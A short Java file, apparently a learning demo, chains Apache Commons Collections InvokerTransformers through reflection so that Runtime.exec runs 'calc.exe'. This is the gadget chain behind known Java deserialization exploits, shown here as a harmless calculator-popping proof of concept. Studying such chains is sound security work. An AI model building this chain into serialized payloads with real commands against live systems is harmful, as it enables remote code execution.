package reflectionChain;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;

public class ReflectionChain {
	public static void main(String[] args) throws Exception {
		
		Transformer[] transformers=new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod",new Class[] {
						String.class,Class[].class},new Object[] {
						"getRuntime",null
						}
				),
				new InvokerTransformer("invoke",new Class[] {
						Object.class,Object[].class},new Object[] {
						null,null
						}
				),
				new InvokerTransformer("exec",new Class[] {
						String.class},new Object[] {
						"calc.exe"
						}
				)
		};
		
		ChainedTransformer chain= new ChainedTransformer(transformers);
		chain.transform(null);
	}
}